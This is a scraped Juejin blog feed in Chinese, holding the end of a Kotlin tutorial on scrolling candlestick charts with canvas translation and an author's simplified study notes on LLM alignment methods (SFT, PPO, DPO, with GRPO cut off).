    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 数据总宽度小于等于屏幕宽度，不需要滚动，从左往右绘制</span>
        <span class="hljs-comment">// 第一根K线的左边界对齐屏幕左边界</span>
        <span class="hljs-number">0f</span>
    }
}
</code></pre>
<p><strong>计算说明</strong>：</p>
<ul>
<li><code>minTranslateX = screenWidth - klineData.size * totalCandleWidth</code>：让最后一根K线的右边界对齐屏幕右边界</li>
<li><code>maxTranslateX = 0f</code>：让第一根K线的左边界对齐屏幕左边界</li>
<li>使用线性映射：<code>translateX = (scrollX / minScrollX) * (maxTranslateX - minTranslateX) + minTranslateX</code></li>
<li>当数据总宽度小于等于屏幕宽度时，<code>translateX = 0f</code>，从左往右绘制</li>
</ul>
<h4 data-id="heading-9">2. 平移坐标系并计算可见范围</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 平移坐标系</span>
<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.save</span>()
<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.translate</span>(translateX, <span class="hljs-number">0</span>f)  <span class="hljs-comment">// 向左平移 translateX 像素（translateX 为负值）</span>

<span class="hljs-comment">// 计算可见范围</span>
val leftLogicalX = -translateX      <span class="hljs-comment">// 屏幕左边界在逻辑坐标系中的位置</span>
val rightLogicalX = -translateX + <span class="hljs-attribute">width</span>  <span class="hljs-comment">// 屏幕右边界在逻辑坐标系中的位置</span>

<span class="hljs-comment">// 转换为K线索引</span>
val firstVisibleIndex = (leftLogicalX / totalCandleWidth)<span class="hljs-selector-class">.toInt</span>()
    <span class="hljs-selector-class">.coerceAtLeast</span>(<span class="hljs-number">0</span>)
    <span class="hljs-selector-class">.coerceAtMost</span>(klineData.size - <span class="hljs-number">1</span>)
val lastVisibleIndex = kotlin<span class="hljs-selector-class">.math</span><span class="hljs-selector-class">.ceil</span>(rightLogicalX / totalCandleWidth)<span class="hljs-selector-class">.toInt</span>()
    <span class="hljs-selector-class">.coerceAtMost</span>(klineData.size - <span class="hljs-number">1</span>)
</code></pre>
<p><strong>说明</strong>：</p>
<ul>
<li>右边界使用 <code>ceil</code> 向上取整，确保包含部分可见的K线</li>
<li>这样就能实现半根K线的显示效果</li>
</ul>
<h4 data-id="heading-10">3. 绘制K线</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 获取可见数据并计算价格范围</span>
val visibleData = klineData<span class="hljs-selector-class">.subList</span>(firstVisibleIndex, lastVisibleIndex + <span class="hljs-number">1</span>)
val (minPrice, maxPrice) = <span class="hljs-built_in">calculatePriceRange</span>(visibleData)

<span class="hljs-comment">// 绘制K线（使用固定逻辑坐标）</span>
visibleData<span class="hljs-selector-class">.forEachIndexed</span> { relativeIndex, entity -&gt;
    <span class="hljs-built_in">drawCandle</span>(canvas, entity, firstVisibleIndex + relativeIndex, minPrice, maxPrice, height)
}

<span class="hljs-selector-tag">canvas</span><span class="hljs-selector-class">.restore</span>()

<span class="hljs-comment">// 绘制网格和标签（在屏幕坐标系中）</span>
<span class="hljs-built_in">drawBackgroundGrid</span>(canvas, width, height)
<span class="hljs-built_in">drawPriceLabels</span>(canvas, minPrice, maxPrice, height, width)
<span class="hljs-built_in">drawTimeLabels</span>(canvas, visibleData, translateX, width, height)
</code></pre>
<p><strong>drawCandle 方法</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">drawCandle</span><span class="hljs-params">(
    canvas: <span class="hljs-type">Canvas</span>,
    entity: <span class="hljs-type">KLineEntity</span>,
    index: <span class="hljs-type">Int</span>,
    minPrice: <span class="hljs-type">Float</span>,
    maxPrice: <span class="hljs-type">Float</span>,
    height: <span class="hljs-type">Float</span>
)</span></span> {
    <span class="hljs-comment">// 计算X坐标（基于索引，在逻辑坐标系中）</span>
    <span class="hljs-keyword">val</span> totalCandleWidth = config.getTotalCandleWidth()
    <span class="hljs-keyword">val</span> centerX = index * totalCandleWidth + totalCandleWidth / <span class="hljs-number">2</span>
    <span class="hljs-comment">// ... 绘制K线</span>
}
</code></pre>
<p><strong>说明</strong>：</p>
<ul>
<li>每根K线的X坐标基于原始索引计算，是固定值</li>
<li>通过 <code>canvas.translate()</code> 平移坐标系，K线会自动移动到正确位置</li>
<li><code>canvas.restore()</code> 后绘制网格和标签，使用屏幕坐标系</li>
</ul>
<h3 data-id="heading-11">四、Case4 与 Case5 的区别</h3>



































<table><thead><tr><th>功能</th><th>Case4</th><th>Case5</th></tr></thead><tbody><tr><td>可见区间计算</td><td>按整根K线计算</td><td>按像素计算</td></tr><tr><td>支持半根K线</td><td>❌</td><td>✅</td></tr><tr><td>X坐标计算</td><td>手动计算 + offsetX</td><td>固定索引，通过 translate 平移</td></tr><tr><td>拖拽平滑度</td><td>一般</td><td>非常平滑</td></tr><tr><td>代码复杂度</td><td>较高</td><td>较低</td></tr></tbody></table>
<h3 data-id="heading-12">五、优势总结</h3>
<ol>
<li><strong>代码更简洁</strong>：不需要为每根K线单独计算X坐标偏移</li>
<li><strong>逻辑更清晰</strong>：K线的X坐标基于固定索引，通过坐标系变换实现滚动</li>
<li><strong>支持像素级精度</strong>：<code>translateX</code> 可以是任意像素值，K线会精确移动</li>
<li><strong>自动处理边界</strong>：半根K线会自动显示在正确位置，不需要额外的边界处理逻辑</li>
</ol>
<h3 data-id="heading-13">六： 效果</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a986bf380a943ea892e5b7d1ecdeff2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2b57O75omT5bel5LuU:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769163224&amp;x-signature=ioEDpJBv%2BYERCVbxSh3Tvzsk3YA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">系列</h3>
<ul>
<li><a href="https://juejin.cn/post/7594627998839701546" target="_blank" title="https://juejin.cn/post/7594627998839701546">K线绘制前言</a></li>
<li><a href="https://juejin.cn/post/7594533204003127359" target="_blank" title="https://juejin.cn/post/7594533204003127359">绘制K线入门</a></li>
<li><a href="https://juejin.cn/post/7594523145211117622" target="_blank" title="https://juejin.cn/post/7594523145211117622">绘制K线第一章：可见区间处理</a></li>
<li><a href="https://juejin.cn/post/7594642978696495167" target="_blank" title="https://juejin.cn/post/7594642978696495167">绘制K线第二章：背景网格绘制</a></li>
<li><a href="https://juejin.cn/post/7594854295758061611" target="_blank" title="https://juejin.cn/post/7594854295758061611">绘制K线第三章：拖拽功能实现</a></li>
<li><a href="https://juejin.cn/spost/7595615310181040182" target="_blank" title="https://juejin.cn/spost/7595615310181040182">绘制K线第四章：滚动优化</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SFT/DPO/PPO/GRPO/RLHF 等对齐方法总结-初版]]></title>    <link>https://juejin.cn/post/7595615310181056566</link>    <guid>https://juejin.cn/post/7595615310181056566</guid>    <pubDate>2026-01-16T10:19:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595615310181056566" data-draft-id="7595552420048240683" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SFT/DPO/PPO/GRPO/RLHF 等对齐方法总结-初版"/> <meta itemprop="keywords" content="算法,人工智能"/> <meta itemprop="datePublished" content="2026-01-16T10:19:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="矮人三等"/> <meta itemprop="url" content="https://juejin.cn/user/4350105576808472"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SFT/DPO/PPO/GRPO/RLHF 等对齐方法总结-初版
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4350105576808472/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    矮人三等
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T10:19:06.000Z" title="Fri Jan 16 2026 10:19:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读21分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<ol>
<li>文中的公式比较粗糙，建议看原版公式，此处公式仅作为个人理解使用的简化版</li>
</ol>
<h3 data-id="heading-1">1 SFT（Supervised Fine - Tuning，监督微调）</h3>
<ol>
<li>
<p>SFT 是在预训练大模型基础上，用高质量标注的输入 - 输出对数据进一步训练模型，使其适配特定任务、遵循人类指令并生成符合预期响应的核心技术，是大模型从通用能力到场景化对齐的关键一步。</p>
</li>
<li>
<p><strong>最基础的微调，目标是“让模型生成符合指令的回答”，强调准确</strong></p>
</li>
<li>
<p>SFT 和微调方法的区别：SFT 是 <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2FLian_Ge_Blog%2Farticle%2Fdetails%2F156489537%3Fspm%3D1001.2014.3001.5501" target="_blank" title="https://blog.csdn.net/Lian_Ge_Blog/article/details/156489537?spm=1001.2014.3001.5501" ref="nofollow noopener noreferrer">微调</a> “目标和阶段”，LoRA 是实现 SFT 的 “技术手段” 之一</p>
<ol>
<li>SFT ≈ 基础微调方法（LoRA / 全参数 / Prefix-Tuning 等） + SFT 专属数据格式（带角色标识的输入输出对） + SFT 适配训练策略（prompt损失屏蔽 / 低学习率(防止灾难性遗忘) / 生成控制等）
<ol>
<li>基础微调方法是 “工具”，决定了 “用什么方式调参”；</li>
<li>SFT 数据格式是 “原材料”，决定了 “微调学什么内容”；</li>
<li>SFT 训练策略是 “施工规范”，决定了 “怎么调参才不让模型向着预期方向调整”</li>
</ol>
</li>
</ol>
</li>
<li>
<p>SFT 的数据和基础微调方法所用数据的区别：</p>






























<table><thead><tr><th>对比维度</th><th>基础微调数据</th><th>SFT 数据</th></tr></thead><tbody><tr><td>数据目标</td><td>让模型学会 “分类 / 识别 / 简单匹配”</td><td>让模型学会 “理解指令→生成符合人类习惯的自然语言回答”</td></tr><tr><td>文本长度</td><td>短（输入 / 输出多为短句 / 标签）</td><td>长（输入含上下文 / 规则，输出是完整、流畅的自然语言）</td></tr><tr><td>损失计算</td><td>全输入计算损失</td><td>仅计算 assistant（回答）部分的损失（屏蔽 system/user 部分）</td></tr><tr><td>多样性要求</td><td>侧重覆盖任务类别</td><td>侧重覆盖不同指令场景、不同回答风格（符合人类偏好）</td></tr></tbody></table>
</li>
<li>
<p>关于使用不同的微调方法的时候，数据的格式变化：</p>
<ol>
<li>基础微调（文本分类）：“这部电影超好看” → 标签 “正面”</li>
<li>SFT 微调（对话）：<code>&lt;system&gt;你是影评助手&lt;/system&gt;&lt;user&gt;这部电影超好看？&lt;/user&gt;&lt;assistant&gt;看来你很喜欢这部电影呀，能具体说说哪里打动你吗？&lt;/assistant&gt;</code></li>
<li>如果有些微调方法也是在前缀或者提示词入手，那就需要调整下数据格式，确实是会变的复杂一些，所以选择微调方法的原则顺序：
<ol>
<li>原则 1：优先适配数据格式，而非换微调方法</li>
<li>原则 2：如果数据格式极度不规范（如无明确输入输出边界），优先选不需要适配数据格式的方法，如 LoRA</li>
<li>原则 3：所有微调方法的核心适配点都是 “明确输入 / 输出边界”—— 哪怕数据格式乱，只要能区分 “模型该学的输入” 和 “模型该生成的输出”，就能用任何微调方法。</li>
</ol>
</li>
</ol>
</li>
<li>
<p>关于 prompt(其实指的就是 system 和 user 的信息) 损失屏蔽</p>
<ol>
<li>SFT 的核心目标是：让模型看到<code>system+user</code>的指令后，能生成符合预期的<code>assistant</code>回答。如果计算全部文本的损失，会出现两个问题：
<ol>
<li>模型会浪费算力去 “学习重复指令”（比如生成时重复<code>user</code>的问题）；</li>
<li>模型可能学偏：比如把<code>system</code>的规则（“你是医疗助手”）当成回答内容输出，而非遵守规则。</li>
<li>注：因为最终符合人类习惯的输出，是需要调整 assistant 来输出的，并不需要输出 system 提示和 user 的话，只需要回答即可</li>
<li>注：如何只计算 assistant 损失呢？
<ol>
<li>构建一个 “损失掩码（mask）”，让<code>system+user</code>部分的损失被置为 0（不参与梯度更新），只有<code>assistant</code>部分的损失参与计算。</li>
<li>移位预测：大模型是自回归生成，预测第 n 个 token 时用前 n-1 个 token，所以掩码也要对应移位；</li>
<li>最后除以有效 token 数：保证损失值的合理性，避免因有效 token 少导致损失值过大。</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p>角色标识（system/user/assistant） 是大模型 SFT 特有的，用于区分对话角色和输入输出边界，基础微调不用，因为场景更简单；</p>
</li>
<li>
<p>eos 的核心含义：End of Sequence，即 “序列结束符”</p>
<ol>
<li>eos 是一个特殊的 token（比如 GPT 系列的<code>&lt;|endoftext|&gt;</code>、Llama 的<code>&lt;/s&gt;</code>），作用是告诉模型：“生成到这个 token 就停止，不要再继续输出了”，原因如下
<ol>
<li>避免生成冗余，效果反而不好；</li>
<li>控制算力成本：生成的 token 越多，推理耗时和算力消耗越大；</li>
<li>保证回答聚焦：限制长度能让模型优先输出核心信息，而非无关内容</li>
</ol>
</li>
</ol>
</li>
<li>
<p>实际控制生成结果的参数：</p>
<ol>
<li><code>max_new_tokens</code>：只限制 “新生成的回答部分” 长度，不包含输入的 prompt；</li>
<li><code>eos_token_id</code>：指定终止符的 id，模型生成到这个 token 立即停止；</li>
<li><code>temperature</code>：控制生成的随机性（0.7 是常用值，值越小越确定，越大越多样）。</li>
</ol>
</li>
</ol>
<h3 data-id="heading-2">2 PPO (Proximal Policy Optimization 近端策略优化)</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab91f3610d7142799f88d388d2cb9f23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55-u5Lq65LiJ562J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769163546&amp;x-signature=TQxmHl5qX1vfCOUIcUt1BMpZQzg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<ol>
<li>
<p><strong>RLHF的核心环节，目标是“通过强化学习进一步对齐人类偏好”，强调在线调整和精准匹配人类偏好</strong></p>
</li>
<li>
<p>PPO 是一种策略梯度强化学习算法**，技术上的核心目标是解决传统策略梯度 “更新幅度过大导致训练崩溃” 的痛点，兼具**TRPO的稳定性和策略梯度的简洁性，是大模型 RLHF（基于人类反馈的强化学习）流程中的核心优化算法。</p>
<ol>
<li>策略梯度简化公式：ln(π(a|α)) * R，策略α下，生成动作 a (对应的 token)的概率，取对数后乘以激励模型(或者环境打分)的打分
<ol>
<li>相乘类似于"生成意愿" * "回答好坏"，如果 R 很大，生成概率π也很大，ln(π)就会慢慢靠近 0，而这才是损失函数的目标，这样就会让模型“朝着奖励高的方向调整参数”**。
<ol>
<li>注：此处的π是函数不是圆周率π，所以π(a|α)是生成概率，那就是 0&lt; π &lt; 1，log(π)在0-1 之间是递增，且数值小于 0</li>
</ol>
</li>
</ol>
</li>
<li>TRPO(信任域策略优化)：<strong>给策略调整设 “上限”</strong>，规定每次只能在 “信任域” 里小幅度改，确保改完后的策略不会和原来差太远，训练更稳定。
<ol>
<li>简易公式：max(π-n(a | α) /  π-o(a | α)  * R)  新旧策略的比值，乘以奖励打分的最大值
<ol>
<li>限制条件：π-n(a | α) 和π-o(a | α) 新旧策略的KL 散度不能超过 信任域阈值</li>
<li>因为如果还是上面取 log，那如果打分特别大就会导致模型调整过多，纠正过度，使用新旧策略的比值作为<strong>重要性权重</strong>就是为了不让新策略和旧策略变化太多，让训练更平稳</li>
<li>注：但是新旧策略生成 token 概率 KL 散度需要&lt;信任域阈值，这个计算很复杂，所以有了下面的 PPO</li>
<li>注：新策略在下一轮迭代训练后就变成了旧策略</li>
</ol>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p>PPO通常是SFT之后的第二步，业务上目标是让<strong>模型生成更符合人类偏好的回答</strong></p>
<ol>
<li>核心思想：通过<strong>裁剪的替代目标函数</strong>限制新策略与旧策略的差异（保持在可控的 “信任域” 内），允许对采样数据进行<strong>多轮小批量更新</strong>，提升样本效率</li>
</ol>
</li>
<li>
<p>核心架构：Actor-Critic + 参考模型 + 奖励模型</p>
<ol>
<li>补：重要性采样：旧策略和新策略用的是同一批数据，旧策略生成的样本，新策略使用的时候需要对数据进行加权(P_n / P_o P 是概率分布，权重就是新旧策略的概率比)</li>
<li>价值模型：<strong>给模型的 “生成行为” 打分</strong>（判断这个回答好不好）
<ol>
<li>单独训练一个小型模型（比如用 BERT / 小尺寸 LLaMA），专门干 “打分” 的活，输入是 “用户问题 + 模型回答”，输出是 0-10 的分数。</li>
<li>Actor 和 Critic 用<strong>同一个预训练模型主干</strong>（比如 LLaMA 7B 的主体部分，本质是隐藏层的输出），只在最后加一个不同的 “输出层”：Actor 的输出层是 “生成 token 的概率”(logits 经过 softmax 的值)，Critic 的输出层是 “标量分数”。</li>
<li>目标：让模型算准 “平均奖励”</li>
<li>共享主干并不是说这俩模型是一个模型干两件事，只是共享主干，然后接入不同下游，价值模型需要和奖励模型配合才能模拟出来"平均奖励"</li>
</ol>
</li>
</ol>






























<table><thead><tr><th>模型</th><th>作用</th><th>实现方式</th></tr></thead><tbody><tr><td>Actor（策略模型）</td><td>生成回答（动作），优化目标是最大化累积奖励</td><td>通常是使用 LoRA方法SFT 微调后的预训练模型（低秩微调，降低算力成本）</td></tr><tr><td>Critic（价值模型）</td><td>估计状态（文本上下文）的价值，计算优势函数（Advantage）</td><td>可以是独立的小型模型，或与 Actor 共享主干（更高效）</td></tr><tr><td>Reference Model（参考模型）</td><td>计算新策略与原始 SFT 策略的 KL 散度（防止模型偏离能力，旧策略）</td><td>固定的 SFT 模型（不参与训练）</td></tr><tr><td>Reward Model（奖励模型）</td><td>对 Actor 生成的回答打分，提供人类偏好反馈信号</td><td>独立训练的模型，输入为 “prompt + 回答”，输出为标量分数</td></tr></tbody></table>
</li>
<li>
<p>裁剪损失简化公式：L_clip =  min(R_t * R , R_clip * R)，(真实情况是用的 A^t 而不是 R)其中 R_t 就是上面 TRPO 中的重要性权重(新旧策略概率比)，R_clip 是权重裁剪后的结果：R_clip = max(min(Rt,1+ϵ), 1−ϵ)，这样依然可以实现限制损失，控制更新幅度，计算量小很多</p>
</li>
<li>
<p>新旧策略的 KL 散度通俗讲就是：旧策略（比如 SFT 后的模型）和新策略（PPO 训练中的模型），分别对同一个用户问题生成回答，输出每个 token 的<strong>生成概率</strong>，KL 散度就是把两个策略的 “token 概率分布” 做对比，算出一个数值，代表两者的 “差异度”</p>
</li>
<li>
<p>优势估计（Advantage Estimation）</p>
<ol>
<li>目的：衡量当前动作比 “平均期望” 好多少，是策略梯度的核心信号</li>
<li>常用<strong>GAE（广义优势估计）</strong>：平衡高方差和高偏差
<ol>
<li>核心作用是：<strong>综合 “短期奖励” 和 “长期奖励”，准确判断模型的一个 “生成动作” 到底好不好</strong>。</li>
<li>下方的 A^t 是单步优势值，GAE 计算是长期的，优化过的优势值</li>
</ol>
</li>
</ol>
</li>
<li>
<p>完整 PPO 损失函数：L = L_clip - c1 * L_vf + c2 * L_kl</p>
</li>
<li>
<p>完整步骤：PPO 训练是一个<strong>迭代优化过程</strong>，每一轮都包含以下五个步骤：</p>
<ol>
<li>样本采集：Actor（新策略）和 Reference Model（旧策略）对一批 prompt 生成回答，记录 “prompt + 回答 + 旧策略概率”</li>
<li>奖励计算：
<ol>
<li>Reward Model 对每个回答打分，得到基础奖励 R，使用价值模型得到预估平均奖励 V
<ol>
<li>优势值 A^t = R - V</li>
</ol>
</li>
</ol>
</li>
<li>计算裁剪损失：L_clip =  min(R_t * A^t , R_clip * A^t)</li>
<li>计算价值损失： L_vf = (V - R )^2</li>
<li>计算新策略与 Reference Model 的 KL 散度（作为惩罚项,可选）</li>
</ol>
</li>
</ol>
<h2 data-id="heading-3">3 DPO(Direct Preference Optimization)</h2>
<ol>
<li>PO 系列：<strong>进阶微调，目标是“让模型生成符合人类偏好的回答，简单对齐，离线调整”</strong></li>
<li>核心特点是<strong>无需额外训练奖励模型（RM）和价值模型（Critic）</strong>，仅通过<strong>SFT 后的模型</strong>和<strong>人类偏好对数据</strong>即可完成优化，兼具<strong>简单、稳定、低成本</strong>三大优势，是资源有限场景下偏好对齐的首选方案。</li>
<li>DPO 的核心逻辑可概括为 <strong>“直接用人类偏好对约束模型的生成概率”</strong>：
<ol>
<li>对于同一个问题x，让模型πθ生成好回答y+的对数概率，尽可能大于生成差回答y−的对数概率；</li>
<li>以 SFT 后的参考模型πref为基准，避免模型为了迎合偏好而丢失 SFT 阶段学会的基础能力；</li>
<li>无需像 PPO 那样通过 “RM 打分→Critic 预估→优势值计算” 的复杂链路，直接通过偏好对数据完成优化。</li>
</ol>
</li>
<li>L_d = -ln(σ（β * （ln π_θ（y+ ｜ x）-  ln π_θ（y- ｜ x）））) 单样本版本
<ol>
<li>ln π_θ（y+ ｜ x）-  ln π_θ（y- ｜ x） 表示：模型生成好回答的对数概率和，减去生成差回答的对数和
<ol>
<li>作用就是，如果差值如正，说明当前生成好回答的概率大于差的回答，符合偏好，如果差值是负，说明不符合偏好需要继续优化</li>
<li>对比就是 PPO 中，需要使用奖励模型打分和优势值的复杂奖励信号，逻辑更简单</li>
</ol>
</li>
<li>β * （ln π_θ（y+ ｜ x）-  ln π_θ（y- ｜ x）） 用温度系数β对 “对数概率差” 进行缩放，控制对差回答的惩罚程度，防止模型过拟合，缺乏泛化能力</li>
<li>σ(-) 将缩放后的对数概率差，输入 Sigmoid 函数，映射到(0,1)区间。通俗理解就是转化对数概率差为判断模型偏好好回答的概率</li>
<li>-ln(-) 把偏好好回答的概率转化成可优化的损失值，原因是：
<ol>
<li>如果σ(-)的结果趋近于 1，ln(1)是等于 0 的，也就是损失为 0，说明模型表现好，无需大幅调整参数；</li>
<li>防止就是损失为+♾️，需要大幅调整降低损失</li>
</ol>
</li>
</ol>
</li>
<li>完整训练流程：
<ol>
<li>数据处理：
<ol>
<li><strong>数据格式</strong>：必须是 <strong>「Prompt x + 好回答 y+ + 差回答 y−」</strong> 的三元组格式，这是 DPO 的核心数据基础，同时序列长度需要一致
<ol>
<li>通俗比喻就是：问题+ 好回答+查回答</li>
</ol>
</li>
<li>数据来源：线上用户反馈，标注人员标注，大模型生成然后人工筛选等方式</li>
</ol>
</li>
<li>模型初始化：
<ol>
<li>加载参考模型，固定其参数(不参与训练)，加载与参考模型一样的 SFT模型，作为待优化模型</li>
<li>可选：对待优化模型进行微调(参考模型不动)，微调只是使用不同的数据和方法进行处理，此处是替换了数据和损失函数，还是用的同样的微调方法，所以是可以使用的，一个是用交叉熵损失，一个用 DPO 损失</li>
</ol>
</li>
<li>计算 DPO 损失：按照上面 3 中公式计算批次损失</li>
<li>迭代训练：
<ol>
<li>将批次损失传入优化器（如 AdamW），计算损失对模型参数θ的梯度，通过梯度下降更新参数（若用 LoRA，仅更新 LoRA 矩阵）；</li>
<li><strong>验证与早停</strong>：每训练 1 轮（Epoch），用独立的验证集评估模型的偏好对齐效果（如人工抽查、自动评估指标 MT-Bench/AlpacaEval），若验证集损失不再下降，立即停止训练，避免过拟合；</li>
<li>保存模型</li>
</ol>
</li>
</ol>
</li>
</ol>
<h2 data-id="heading-4">4 GRPO(Group Relative Policy Optimization)</h2>
<ol>
<li>DeepSeek 提出的无价值模型（Critic-Free）强化学习算法，专为 LLM 大规模偏好对齐与推理能力提升设计，核心动机是解决<strong>PPO 的高显存 / 计算成本</strong>，同时保留强化学习的精准对齐能力，区别于 DPO 的纯离线偏好优化思路。</li>
